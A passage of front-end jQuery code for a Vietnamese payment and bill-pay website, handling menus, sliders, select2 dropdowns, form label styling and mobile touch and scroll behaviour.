$(document).ready(function () {
    //New Payment Method
    $('.list-collapse__header__close').on('click', function () {
        $('.navcard-btn').css('display', 'block');
        $('.banks2').css('display', 'none');
        $('.banks1').css('display', 'none');
        $('.ripple').remove();
    });

    //$('html').addClass('no-touch');
    //---------------------------------------CHECKBOX/RADIO-----------------------------------------------------//
    $('.form-group-radio input[type="radio"]:checked').closest('label').addClass('checked'); //Radio form chon bank
    $('.form-group-radio input[type="radio"]').click(function () {
        if ($('.form-group-radio input[type="radio"]').is(':not(:checked)')) {
            $('.form-group-radio input[type="radio"]').parent('label').removeClass('checked');
        }
        if ($('.form-group-radio input[type="radio"]').is(':checked')) {
            $('.form-group-radio input[type="radio"]:checked').closest('label').addClass('checked');
        }
        //if ($('input.logo-big').is(':checked')) {
        //    $('.radio-big-info').css('display', 'block');
        //} else {
        //    $('.radio-big-info').css('display', 'none');
        //}
        $('.form-group-radio input[type="radio"]:checked').closest('.wrap').siblings('.wrap').find('.list-option-collapse').collapse('hide');
    });
    $('.checkbox-radio__input:checked').closest('label').addClass('active');
    $('.checkbox-radio__input').click(function () {
        if ($('.checkbox-radio__input:not(:checked)')) {
            $('.checkbox-radio__input').closest('label').removeClass('active');
        }
        if ($('.checkbox-radio__input:checked')) {
            $(this).closest('label').addClass('active');
        }
    });
    (function ($) {
        var IS_IOS = /iphone|ipad/i.test(navigator.userAgent);
        $.fn.nodoubletapzoom = function () {
            if (IS_IOS)
                $(this).bind('touchstart', function preventZoom(e) {
                    var t2 = e.timeStamp,
                        t1 = $(this).data('lastTouch') || t2,
                        dt = t2 - t1,
                        fingers = e.originalEvent.touches.length;
                    $(this).data('lastTouch', t2);
                    if (!dt || dt > 500 || fingers > 1) return; // not double-tap

                    e.preventDefault(); // double tap - prevent the zoom
                    // also synthesize click events we just swallowed up
                    $(this).trigger('click').trigger('click');
                });
        };
    })(jQuery);
    $('.select2-dropdown').nodoubletapzoom();
    //---------------------------------------END CHECKBOX/RADIO-----------------------------------------------------//


    //---------------------------------------RELOAD BIG CHECK-----------------------------------------------------//
    var bigCheck = $('.bigCheck').attr('src');
    $(".bigCheck").attr("src", bigCheck + "?" + Math.random());
    //---------------------------------------END RELOAD BIG CHECK-----------------------------------------------------//


    //---------------------------------------TOOLTIP-----------------------------------------------------//
    $('[data-toggle="tooltip"]').tooltip();
    //---------------------------------------ENDTOOLTIP-----------------------------------------------------//


    //---------------------------------------MEGA-DROPDOWN--MENU-----------------------------------------------------//
    $('.mega-show-more a').on('click', function () {
        $('.mega-menu .navbar-nav').addClass('mega-menu--more');
        $('.mega-menu .navbar-nav').removeClass('mega-menu--less');
    });
    $('.mega-show-less a').on('click', function () {
        $('.mega-menu .navbar-nav').addClass('mega-menu--less');
        $('.mega-menu .navbar-nav').removeClass('mega-menu--more');
    });
    $('.dropdown-menu.sm-mega-menu li').css('min-width', $('li.dropdown.mega-dropdown').width());
    jQuery(document).on('click', '.mega-dropdown', function (e) {
        e.stopPropagation()
    });
    $('.btn-close').click(function (e) {
        $('.btn-close').dropdown('toggle');
    });
    $(".active.sub-menu > a").css("color", "#00baf3");
    $(".active.sub-menu > a").css("font-size", "16px");
    $(".active.sub-menu").click(function () {
        $(".active.sub-menu a:not('.dropdown-sub--hover__a')").removeAttr('data-toggle');
        $(this).toggleClass('active');
    });
    $('.sub-menu').on('show.bs.dropdown', function () {
        $(this).find('.dropdown-menu').first().stop(true, true).slideDown(150);
    });
    $('.sub-menu').on('hide.bs.dropdown', function () {
        $(this).find('.dropdown-menu').first().stop(true, true).slideUp(150);
    });
    $('nav ul.dropdown-menu').on('click', function (e) {
        e.stopPropagation();
    });
    var megaMenuHeight = $('.mega-menu').height();
    var navabarTopHeight = $('.navbar-top').height();
    if ($(window).width() > 1199) {
        $('.visible-big-screen').removeClass('dropdown');
        $('.visible-big-screen').removeClass('sub-menu');
        $('.visible-big-screen > a').css('font-size', 'inherit');
        $('.visible-big-screen > a').removeAttr('data-toggle');
        $('.visible-big-screen .arrow').remove();
        $('.visible-big-screen > ul').remove();
        $('.dropdown-sub--hover > a').css('font-size', 'inherit');
        $('.dropdown-sub--hover__a').removeAttr('data-toggle');
    } else {
        $('.visible-big-screen > a').attr('href', '#');
    }
    //---------------------------------------ENDMEGA-DROPDOWN--MENU-----------------------------------------------------//


    //---------------------------------------HEIGHT CALCULATE-----------------------------------------------------//
    var height = window.innerHeight ? window.innerHeight : $(window).height(); // height of window
    if ($(window).width() > 1024) {
        $(window).resize(function () {
            $(".wrap-bottom").css('height', $(window).height() - $('.navbar').height()); //height bottom
            $(".dropdown-menu.mega-dropdown-menu.row").css("height", $(window).height() - navabarTopHeight - megaMenuHeight - 2); //height mega menu
            $('.swiper-container').css('height', $(window).height() - megaMenuHeight - $('.navbar').height()); //height swiper

        });
        $('.section-body-middle').css('min-height', $('.section-body-left').height());
        var footerHeight = $('footer').outerHeight() + 20; //footer height
        $('.affix-wrap').affix({
            offset: {
                top: ($('.section-body.row').offset() || {"top": NaN}).top,
                bottom: footerHeight
            }
        }); //cal affix sticky
        $(".affix-wrap").css('width', $(".affix-wrap").parent().width());
        $(".affix-wrap").on('affix.bs.affix', function () {
            $('.affix-wrap').css('top', 0);
            $(".affix-wrap").css('width', $(".affix-wrap").parent().width());
            // updateqrpay 4619
            $('.affix-wrap').css('left', $('.col-affix').offset().left + 15);
        }); // affix event
    }
    $(".wrap-bottom").css("height", $(window).width() < 340 ? 500 : height - $('.navbar').height() + $('.mega-menu .bg-white').height()); // height when reload not resize
    $(".wrap-bottom").css('margin-top', $('.navbar').height());
    $(".dropdown-menu.sm-mega-menu").css("max-height", height - navabarTopHeight - megaMenuHeight); // real height mega menu
    //---------------------------------------END HEIGHT CALCULATE-----------------------------------------------------//


    //---------------------------------------CHANGE IMG PATH-----------------------------------------------------//
    $('li.dropdown.mega-dropdown').on('shown.bs.dropdown', function () {
        $('.navbar-top').css("border-bottom", '0px solid #00baf3');
        $('.open .svg').each(function () {
            var msrc = $(this).attr('src');
            msrc = msrc.split('/'); //images, services, image.jpg
            var lastelem = msrc.pop(); //images, services     // lastelem: image.jpg
            var lastelem1 = msrc.pop();
            msrc.push('ic_light'); //images, services, large   // lastelem: image.jpg 
            msrc.push(lastelem); //images, services, large, image.jpg
            msrc = msrc.join('/'); //"images/services/large/image.jpg"
            $(this).attr('src', msrc);
        });
    });
    $('li.dropdown.mega-dropdown').on('hidden.bs.dropdown', function () {
        $('.navbar-top').css("border-bottom", '0');
        $('.svg').each(function () {
            var msrc = $(this).attr('src');
            msrc = msrc.split('/'); //images, services, image.jpg
            var lastelem = msrc.pop(); //images, services     // lastelem: image.jpg
            var lastelem1 = msrc.pop();
            msrc.push('ic_light'); //images, services, large   // lastelem: image.jpg 
            msrc.push(lastelem); //images, services, large, image.jpg
            msrc = msrc.join('/'); //"images/services/large/image.jpg"
            $(this).attr('src', msrc);
        });
    });
    $('li.dropdown.mega-dropdown').on('hidden.bs.dropdown', function () {
        $('#navbar1').css("border-bottom", '0');
    })
    $('.dropdown-search').on('shown.bs.dropdown', function () {
        $('.input-search').focus(); //input search
    });
    //---------------------------------------END CHANGE IMG PATH-----------------------------------------------------//


    //---------------------------------------MENU MOBILE CHANGE-----------------------------------------------------//
    $('#navbar-1').on('show.bs.collapse', function () {
        $('.dropdown-search').animate({
            opacity: 0, // animate slideUp
            right: '-50px'
        }, 'fast', 'linear', function () {

        }); // search icon slide out
        var height = window.innerHeight ? window.innerHeight : $(window).height();
        $(".full-nav").css("height", height);
        $(window).resize(function () {
            $(".full-nav").css("height", $(window).height());
        }); // cal full open in mobile resize
    });
    $('#navbar-1').on('hide.bs.collapse', function () {
        $('.dropdown-search').animate({
            opacity: 1, // animate slideUp
            right: '0'
        }, 'fast', 'linear', function () {

        });
    }); // show search bar again
    $(".navbar-toggle").click(function () {
        if ($("#navbar-1").hasClass("in")) {
            return $("body").removeClass("no-scroll");


        } else {
            return $("body").addClass("no-scroll");
        }

    }); //no scroll body when menu show
    //---------------------------------------ENDMENU MOBILE CHANGE-----------------------------------------------------//


    //---------------------------------------SWIPER SLIDE-----------------------------------------------------//
    //if ($('.card-swiper-container').hasClass('card-swiper-container')) {
    //    $('.navbar-card li.active:nth-of-type(1)').closest('ul').find('.navbar-card__slider').css('left', '0%');
    //    $('.card-data').css('display', 'none');
    //    $('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
    //        swiper3.update(); //swiper tab1 05_Mua_ma_the_1.html
    //        swiper4.update(); //swiper tab2 05_Mua_ma_the_1.html
    //        swiper42.update();
    //        $('.ripple').remove();
    //        $('.navbar-card li.active:nth-of-type(2)').closest('ul').find('.navbar-card__slider').css({ 'left': '100%', 'border-radius': '0' });
    //        $('.navbar-card li.active:nth-of-type(1)').closest('ul').find('.navbar-card__slider').css({ 'left': '0%', 'border-radius': '4px 0 0 4px' });
    //        $('.navbar-card li.active:nth-of-type(3)').closest('ul').find('.navbar-card__slider').css({ 'left': '200%', 'border-radius': '0px 4px 4px 0' });
    //        var selectedTabId = e.target.id;
    //        var id = $('.tab-content .active').attr('id');
    //        if (id == "menu3") {
    //            $('.card-data').css('display', 'block');
    //        } else {
    //            $('.card-data').css('display', 'none');
    //        }
    //    });
    //}
    $('.list-option-collapse').on('hidden.bs.collapse', function () {
        $('.ripple').remove();
    });
    var swiper = new Swiper('.swiper-container', {
        pagination: '.swiper-pagination',
        paginationClickable: true,
        nextButton: '.swiper-button-next',
        prevButton: '.swiper-button-prev',
        autoplay: 7000,
        loop: true,
        autoplayDisableOnInteraction: false,
        effect: 'slide',
        speed: 800,
        threshold: 20,
        longSwipesRatio: 0.02,
        preventClicks: true,
        preventClicksPropagation: true
    }); //swiper index

    $('.swiper-slide a').click(function () {
        window.location.href = $(this).prop('href')
    });
    //click link //swiper index
    var swiperHeight = $(window).width() < 340 ? 200 : height - megaMenuHeight - $('.navbar').height() + $('.mega-menu .bg-white').height();
    $('.swiper-container').css('height', swiperHeight);
    var swiper2 = new Swiper('.swiper-container-horizontal-logo', {
        paginationClickable: true,
        slidesPerView: 10,
        spaceBetween: 0,
        loop: true,
        autoplay: 2500,
        autoplayDisableOnInteraction: false,
        breakpoints: {
            1200: {
                slidesPerView: 6,
            },
            1024: {
                slidesPerView: 5,
                spaceBetween: 0
            },
            768: {
                slidesPerView: 5,
                spaceBetween: 30
            },
            640: {
                slidesPerView: 2,
                spaceBetween: 20
            },
            320: {
                slidesPerView: 1,
                spaceBetween: 10
            }
        }
    }); //swiper footer
    //var swiper3 = new Swiper('.card-swiper-container', {
    //    slidesPerView: 4,
    //    spaceBetween: 30,
    //    preventClicks: false,
    //    preventClicksPropagation: false,
    //    nextButton: '.swiper-button-next',
    //    prevButton: '.swiper-button-prev',
    //    breakpoints: {
    //        1200: {
    //            slidesPerView: 4,
    //        },
    //        1024: {
    //            slidesPerView: 3,
    //            spaceBetween: 0
    //        },
    //        768: {
    //            slidesPerView: 3,
    //            spaceBetween: 30
    //        },
    //        640: {
    //            slidesPerView: 3,
    //            spaceBetween: 20
    //        },
    //        320: {
    //            slidesPerView: 2,
    //            spaceBetween: 10
    //        }
    //    }
    //}); //swiper tab1 05_Mua_ma_the_1.html
    //var swiper4 = new Swiper('.card-swiper-container-2', {
    //    slidesPerView: 4,
    //    spaceBetween: 30,
    //    preventClicks: false,
    //    preventClicksPropagation: false,
    //    nextButton: '.swiper-button-next',
    //    prevButton: '.swiper-button-prev',
    //    breakpoints: {
    //        1200: {
    //            slidesPerView: 4,
    //        },
    //        1024: {
    //            slidesPerView: 3,
    //            spaceBetween: 0
    //        },
    //        768: {
    //            slidesPerView: 3,
    //            spaceBetween: 30
    //        },
    //        640: {
    //            slidesPerView: 3,
    //            spaceBetween: 20
    //        },
    //        320: {
    //            slidesPerView: 2,
    //            spaceBetween: 10
    //        }
    //    }
    //}); //swiper tab2 05_Mua_ma_the_1.html
    var swiper5 = new Swiper('.section-news__article__img--swiper', {
        pagination: '.swiper-pagination',
        paginationClickable: true,
        autoplay: 2500,
        autoplayDisableOnInteraction: false,
        effect: 'slide',
        speed: 800,
        threshold: 20,
        longSwipesRatio: 0.02,
        preventClicks: true,
        preventClicksPropagation: true,
        setWrapperSize: true
    }); //swiper index //swiper 10.html
    //---------------------------------------END SWIPER SLIDE-----------------------------------------------------//


    //---------------------------------------INPUT AT VISA-----------------------------------------------------//
    $('label.required').click(function () {
        $(this).siblings('input').focus();
    });
    $('input.form-line__input[type=text]').each(function () {
        if (!$(this).attr('value')) {
            $(this).removeClass('hadVal');
        } else {
            $(this).addClass('hadVal');
        }
    });
    $("input").blur(function () {
        if ($(this).val().length) {
            $(this).siblings('label.required').hide();
        } else {
            $(this).siblings('label.required').show();
        }
    });
    $(".form-line__input").blur(function () {
        if ($(this).val().length) {
            $(this).addClass('hadVal');
        } else {
            $(this).removeClass('hadVal');
        }
    });
    //---------------------------------------END INPUT AT VISA-----------------------------------------------------//

    //---------------------------------------LIST 04_paybill_1.html-----------------------------------------------------//
    $('.group-pay-bill li a').hover(function () {
        var classNameHover = $(this).children('.group-pay-bill-icon').attr('class');
        var lastChar = classNameHover.substr(classNameHover.length - 1);
        var displayClass = '.icon' + lastChar + '-info';
        $(displayClass).toggleClass('visible');
        $('.icon0-info').css('display', 'none');
    });
    $('.group-pay-bill').mouseover(function () {
        $('.icon0-info').css('display', 'none');
    });
    $('.group-pay-bill').mouseout(function () {
        $('.icon0-info').css('display', 'block');
    });
    //$('#btn-show-card').click(function() {
    //    $('#table1').css('display', 'table')
    //});
    //$(".tab-content--card input[type='radio']").click(function() {
    //    var imgChecked = $(".tab-content--card .radio-label-big.checked > .radio-btn-logo");
    //    var inputChecked = $(".tab-content--card .radio-label-big.checked > input");
    //    var cardName = inputChecked.val();
    //    ($('#cardName').children('.lightblue')).html(cardName);
    //    var srcRadioImg = imgChecked.attr('src').split('/');
    //    var nameRadioImg = srcRadioImg[srcRadioImg.length - 1];
    //    newSrclogo = 'url(./images/logo/' + nameRadioImg + ')';
    //    $('.radio-btn-upperlogo').css('background-image', newSrclogo);
    //});
    //---------------------------------------END LIST 04_paybill_1.html-----------------------------------------------------//

    //---------------------------------------SUTTLE CLICK-----------------------------------------------------//
    (function () {

        // http://stackoverflow.com/a/11381730/989439
        function mobilecheck() {
            var check = false;
            (function (a) {
                if (/(android|ipad|playbook|silk|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true
            })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        }

        var support = {animations: Modernizr.cssanimations},
            animEndEventNames = {
                'WebkitAnimation': 'webkitAnimationEnd',
                'OAnimation': 'oAnimationEnd',
                'msAnimation': 'MSAnimationEnd',
                'animation': 'animationend'
            },
            animEndEventName = animEndEventNames[Modernizr.prefixed('animation')],
            onEndAnimation = function (el, callback) {
                var onEndCallbackFn = function (ev) {
                    if (support.animations) {
                        if (ev.target != this) return;
                        this.removeEventListener(animEndEventName, onEndCallbackFn);
                    }
                    if (callback && typeof callback === 'function') {
                        callback.call();
                    }
                };
                if (support.animations) {
                    el.addEventListener(animEndEventName, onEndCallbackFn);
                } else {
                    onEndCallbackFn();
                }
            },
            eventtype = mobilecheck() ? 'touchstart' : 'click';

        [].slice.call(document.querySelectorAll('.cbutton')).forEach(function (el) {
            el.addEventListener(eventtype, function (ev) {
                classie.add(el, 'cbutton--click');
                onEndAnimation(classie.has(el, 'cbutton--complex') ? el.querySelector('.cbutton__helper') : el, function () {
                    classie.remove(el, 'cbutton--click');
                });
            });
        });

    })();
    //---------------------------------------END SUTTLE CLICK-----------------------------------------------------//


    //---------------------------------------MINI HEADROOM-----------------------------------------------------//
    $(function () {
        $('.headroom').each(function () {
            var $win = $(window),
                $self = $(this)

                , isHidden = false, lastScrollTop = 0

            $win.on('scroll', function () {
                var scrollTop = $win.scrollTop()
                var offset = scrollTop - lastScrollTop
                lastScrollTop = scrollTop
                if (scrollTop > 20) {
                    $('.navbar-top').css("border-bottom", '0px solid #00baf3');
                } else {
                    $('.navbar-top').css("border-bottom", '0px solid #00baf3');
                }
                // min-offset, min-scroll-top
                if (offset > 10 && scrollTop > 50) {
                    if (!isHidden) {
                        $self.addClass('headroom-hidden')
                        isHidden = true;
                        $('.dropdown-search').removeClass('open');
                        $('.dropdown-search .dropdown-menu').addClass('box-shadow');
                    }
                } else if (offset < -10 || scrollTop < 50) {
                    if (isHidden) {
                        $self.removeClass('headroom-hidden')
                        isHidden = false;
                    }
                }
            })
        })
    });
    //---------------------------------------END MINI HEADROOM-----------------------------------------------------//
    $.ripple(".radio-btn>label", {
        debug: false, // Turn Ripple.js logging on/off
        on: 'mousedown', // The event to trigger a ripple effect

        opacity: 0.1, // The opacity of the ripple
        color: "auto", // Set the background color. If set to "auto", it will use the text color
        multi: false, // Allow multiple ripples per element

        duration: 0.4, // The duration of the ripple

        // Filter function for modifying the speed of the ripple
        rate: function (pxPerSecond) {
            return pxPerSecond;
        },

        easing: 'linear' // The CSS3 easing function of the ripple
    });
    if ($(window).width() > 1024) {
        $('img.bill-image').zoomify({
            scale: 0.7,
        })
    }
    $('img.bill-image').zoomify({
        scale: 1,
    }).on('zoom-in.zoomify', function () {
        $('.headroom').css('z-index', '1')
    }).on('zoom-out.zoomify', function () {
        $('.headroom').css('z-index', '9998')
    }); //zoomify
    $('.modal').on('hidden.bs.modal', function (e) {
        $('.headroom').css('z-index', '9998')
    }).on('show.bs.modal', function (e) {
        $('.headroom').css('z-index', '99')
    });
    if (document.getElementById('dotdot-js')) {
        $(".news__head-line").dotdotdot({
            ellipsis: '... ',
            wrap: 'letter'
        });
        $('.section-news__article__peak').dotdotdot({
            ellipsis: '... ',
            after: "a.readmore",
            watch: true
        });
    }
    //$(".ui-datepicker-next").on('tap', function(e) {
    //    console.log('User tapped #myElement');
    //});
    //$(".ui-datepicker-prev").on('click', function() { console.log('arf') })
    //var datepicker = {
    //    showButtonPanel: true,
    //    dateFormat: "dd/mm/yy",
    //    showAnim: '',
    //    onClose: function() {
    //        if ($(window).width() < 769) {

    //            $('#ui-datepicker-div').css({
    //                'display': 'block'
    //            });
    //            setTimeout(function() {
    //                $('#ui-datepicker-div').removeClass('transform-0');
    //            }, 1);
    //            setTimeout(function() {
    //                $('#ui-datepicker-div').css('display', 'none');
    //            }, 400);
    //            $('.datepicker').removeAttr('disabled');
    //            $('.datedepart').removeAttr('disabled');
    //            overlayClose();
    //        }
    //        $('.datepicker').blur();
    //        $('.datedepart').blur();
    //    },
    //    beforeShow: function() {
    //        if ($(window).width() < 769) {
    //            setTimeout(function() { overlayOpen(); }, 550);
    //            $('.datepicker').blur();
    //            $('.datedepart').blur();
    //            $('.datepicker').attr('disabled', 'disabled');
    //            $('.datedepart').attr('disabled', 'disabled');
    //        }
    //    },
    //    dayNamesMin: ["CN", "T2", "T3", "T4", "T5", "T6", "T7"],
    //    monthNames: ["Tháng 1", "Tháng 2", "Tháng 3", "Tháng 4", "Tháng 5", "Tháng 6", "Tháng 7", "Tháng 8", "Tháng 9", "Tháng 10", "Tháng 11", "Tháng 12"],
    //    nextText: '',
    //    prevText: '',
    //    firstDay: 1,
    //    showMonthAfterYear: true
    //};
    //$('.datepicker').removeAttr('disabled', 'disabled');
    //$('.datedepart').removeAttr('disabled', 'disabled');
    //if (document.getElementById('jquerry-lunar')) {
    //    var datepickerDepart = {
    //        closeText: "Chọn ngày về",
    //        minDate: $(".datepicker").datepicker('getDate'),
    //        onSelect: function(dateText, inst) {
    //            var date = $(this).val();
    //            $(".datedepart").datepicker("setDate", date);
    //        }
    //    };
    //    var datepickerStart = {
    //        closeText: "Chọn ngày khởi hành",
    //        minDate: 0,
    //        onSelect: function(dateText, inst) {
    //            var date = $(this).val();
    //            $(".datepicker").datepicker("setDate", date);
    //            return date;
    //        }
    //    };
    //    $(".datepicker").datepicker($.extend(datepicker, datepickerStart)).datepicker("setDate", "0");
    //    $(".datedepart").datepicker($.extend(datepicker, datepickerDepart)).datepicker('option', 'minDate', 0);
    //    $(".datepicker").focus(function() {
    //        setTimeout(function() {
    //            $('#ui-datepicker-div').addClass('transform-0');
    //        }, 0.0001);
    //    });
    //    $(".datedepart").focus(function() {
    //        setTimeout(function() {
    //            $('#ui-datepicker-div').addClass('transform-0');
    //        }, 0.0001);
    //    });
    //    $('.ui-datepicker-next').click(function() {

    //    })
    //};
    $('.show-form').click(function () {
        $(this).siblings('.form-group-wrap').slideToggle('fast');
        $(this).siblings('.note').slideToggle('fast');
    });
    $(".select-pay-bill").select2({
        width: '100%',
        placeholder: "Chọn nhà cung cấp",
    });
    $(".select-pay-hocphi").select2({
        width: '100%',
        placeholder: "Chọn trường đại học",
    });
    $(".select-pay-bill-hanhchinhcong").select2({
        width: '100%',
        placeholder: "Chọn đơn vị hành chính",
    });
    $(".select--custom-1r").select2({
        width: '100%',
        placeholder: "Chọn nơi đến",
    });
    $(".select--custom-1l").select2({
        width: '100%',
        placeholder: "Chọn nơi đi",
    });
    $(".select-city").select2({
        width: '100%',
        placeholder: "Chọn thành phố"
    });
    $(".select-city").on('change', function () {
        if (($(this).val() != "") && $(this).hasClass('select-place')) {
            ($('.select-city.select-place').siblings('.form-line__label')).addClass('form-line__label--up')
        }
    });
    $(".select-district").select2({
        placeholder: "Chọn tỉnh",
        width: '100%',
    });
    $(".select-fly").select2({
        width: '100%',
        placeholder: "Hãng hàng không",
        closeOnSelect: false,
        maximumSelectionLength: 5
    });
    $(".select-fly-single").select2({
        width: '100%',
        placeholder: "Hãng hàng không"
    });
    $(".select-fly-number").select2({
        width: '100%',
        placeholder: "",
        minimumResultsForSearch: -1
    });
    $("select").on("select2:unselect", function (evt) {
        if (!evt.params.originalEvent) {
            return;
        }

        evt.params.originalEvent.stopPropagation();
    });
    $(".select-fly").on('change', function () {
        var ele = $(this);
        if (ele.val().length === 5) {
            closeSelect();
        }
    });
    if ($(window).width() < 769) {
        $(".select-fly").on('select2:closing', selectClosing);
        $(".select-city").on('select2:closing', selectClosing);
        $(".select-district").on('select2:closing', selectClosing);
        $(".select-pay-bill").on('select2:closing', selectClosing);
        $(".select--custom-1l").on('select2:closing', selectClosing);
        $(".select--custom-1r").on('select2:closing', selectClosing);
        $(".select-fly-number").on('select2:closing', selectClosing);
        $(".select-fly-single").on('select2:closing', selectClosing);
        $(".select-city").on('change', function () {
            closeSelect();
            if (($(this).val() != "") && $(this).hasClass('select-place')) {
                ($('.select-city.select-place').siblings('span.form-line__label')).addClass('form-line__label--up')
            }
        });
        $(".select-district").on('change', function () {
            closeSelect();
        });
        $(".select--custom-1l").on('change', function () {
            closeSelect();
        });
        $(".select--custom-1r").on('change', function () {
            closeSelect();
        });
        $(".select-pay-bill").on('change', function () {
            closeSelect();
        });
        $(".select-fly-number").on('change', function () {
            closeSelect();
        });
        $(".select-fly").on('change', function () {
            var ele = $(this);
            if (ele.val().length === 5) {
                closeSelect();
            }
        });
        $(".select-city").on('select2:open', function () {
            if ($(this).hasClass('select-fly')) {
                selectOpen('Chọn hãng hàng không');
            } else {
                selectOpen('Chọn thành phố');
            }
        });
        $(".select-fly-single").on('change', function () {
            closeSelect();
        });
        $(".select--custom-1l").on('select2:open', function () {
            selectOpen('Chọn nơi đi');
            setTimeout(function () {
                $('.select2-search__field').focus();
            }, 500);
        });
        $(".select--custom-1r").on('select2:open', function () {
            selectOpen('Chọn nơi đến');
            setTimeout(function () {
                $('.select2-search__field').focus();
            }, 500);
        });
        $(".select-pay-bill").on('select2:open', function () {
            selectOpen('Chọn hóa đơn');
            setTimeout(function () {
                $('.select2-search__field').focus();
            }, 500);
        });
        $(".select-district").on('select2:open', function () {
            selectOpen('Chọn tỉnh');
            setTimeout(function () {
                $('.select2-search__field').focus();
            }, 500);
        });
        $(".select-fly-number").on('select2:open', function () {
            if ($(this).hasClass('select-adult')) {
                selectOpen('Chọn số người lớn');
            }
            if ($(this).hasClass('select-kid')) {
                selectOpen('Chọn số trẻ em 2 - 12 tuổi');
            }
            if ($(this).hasClass('select-infant')) {
                selectOpen('Em bé < 12 tuổi');
            }
            $('.select2-dropdown').prepend('<div class="select-fly-number-id"></div>');
        });
        $(".select-fly-single").on('select2:open', function () {
            selectOpen('Hãng hàng không');
        });
        $(".select-fly").on('select2:open', function () {
            selectOpen2('Hãng hàng không');
            $("#search").keyup(function () {
                select2_search($("#search").val());
            });
            $('#search').attr('placeholder', 'Tìm kiếm');
            $('.select2-search.select2-search--inline .select2-search__field').attr('readonly', 'true')
        });
        $(".select-fly").select2({
            width: '100%',
            placeholder: "Hãng hàng không",
            closeOnSelect: false,
            maximumSelectionLength: 5
        });
        $(".select-city").select2({
            width: '100%',
            placeholder: "Chọn thành phố",
            closeOnSelect: false
        });
        $(".select-district").select2({
            placeholder: "Chọn tỉnh",
            width: '100%',
            closeOnSelect: false
        });
        $(".select--custom-1r").select2({
            width: '100%',
            placeholder: "Chọn nơi đến",
            closeOnSelect: false
        });
        $(".select--custom-1l").select2({
            width: '100%',
            placeholder: "Chọn nơi đi",
            closeOnSelect: false
        });
        $(".select-pay-bill").select2({
            width: '100%',
            placeholder: "Chọn nhà cung cấp",
            closeOnSelect: false
        });
        $(".select-fly-number").select2({
            width: '100%',
            placeholder: "Chọn nhà cung cấp",
            closeOnSelect: false,
            minimumResultsForSearch: -1
        });
        $(".select-fly-single").select2({
            width: '100%',
            placeholder: "Hãng hàng không",
            closeOnSelect: false
        });
        $('.datepicker').attr('readonly', 'true');
        $('.datedepart').attr('readonly', 'true');
    } else {
        $(".select-fly").on('select2:select', function () {
            $('body > .select2-container').css('top', $('.select-fly').offset().top + $('.select2-selection.select2-selection--multiple').outerHeight());
        });
        $(".select-fly").on('select2:unselect', function () {
            $('body > .select2-container').css('top', $('.select-fly').offset().top + $('.select2-selection.select2-selection--multiple').outerHeight());
        });
    }
});

function doFocus() {
    $('.select2-search__field').focus();
}

function selectOpen(x) {
    $('.select2-search__field').attr('placeholder', 'Tìm kiếm');
    $('.select-fly~.select2 .select2-search__field').attr('placeholder', 'Hãng hàng không');
    $('.select2-search__field').prop('focus', false);
    $('.close-select').remove();
    $('.select-fly-number-id').remove();
    //setTimeout(function() { overlayOpen(); }, 400);
    BNS.on();
    $('.select2-dropdown').addClass('top0');
    return $('.select2-dropdown').prepend('<div class="close-select"><div class="close-select__btn" href="javascript:void(0)" onclick="closeSelect()"></div>' + x + '</div>');
    $(this).off('.close-select');
    $(".close-select").select2().trigger("select2:close");
}

var overlayClose = function () {
    $.unlockBody();
}
var overlayOpen = function () {
    $.lockBody();
}
var $docEl = $('html, body'),
    $wrap = $('body'),
    scrollTop;
$.lockBody = function () {
    if (window.pageYOffset) {
        scrollTop = window.pageYOffset;

